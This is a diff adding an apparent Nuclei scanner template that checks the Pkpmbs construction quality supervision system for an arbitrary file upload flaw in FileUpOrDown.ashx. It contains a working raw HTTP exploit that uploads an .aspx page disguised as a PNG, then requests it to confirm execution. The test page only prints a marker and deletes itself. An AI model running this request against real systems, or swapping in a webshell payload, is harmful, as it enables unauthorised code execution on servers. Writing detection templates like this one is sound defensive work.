@@ -1,0 +1,46 @@
+id: pkpmbs-fileupordown-upload
+
+info:
+  name: Pkpmbs FileUpOrDown.ashx - File Upload Vulnerability
+  author: qwtd
+  severity: critical
+  description: |
+    Pkpmbs建设工程质量监督系统 allows arbitrary file uploads via FileUpOrDown.ashx, which can be exploited to upload malicious files.
+  tags: 湖南建研工程质量检测系统
+    
+http:
+  - raw:
+      - |
+        POST /Applications/Forms/SearchSetting/FileUpOrDown.ashx?operation=Fileupload&extName=.aspx&&searchConfigName={{randstr}}.aspx HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+        Accept-Language: zh-CN,zh;q=0.9
+        Connection: close
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundarybqACRhAMBHmQQAUP
+        Content-Length: 405
+        Accept-Encoding: gzip, deflate
+
+        ------WebKitFormBoundarybqACRhAMBHmQQAUP
+        Content-Disposition: form-data; name="Filedata"; filename="indexlist.aspx"
+        Content-Type: image/png
+
+        e165421110ba03099a1c0393373c5b43
+        <%@ Page Language="C#" Debug="true" %>
+        <%@ import Namespace="System"%>
+        <%@ import Namespace="System.IO"%>
+        <% string pageName = Request.PhysicalPath;%>
+        <% File.Delete(pageName);%>
+        ------WebKitFormBoundarybqACRhAMBHmQQAUP--
+
+      - |
+        GET /Excel/Templete/{{randstr}}.aspx HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36
+        Accept: */*
+        Connection: close
+
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code_2 == 200 && contains(body_2, "e165421110ba03099a1c0393373c5b43")'
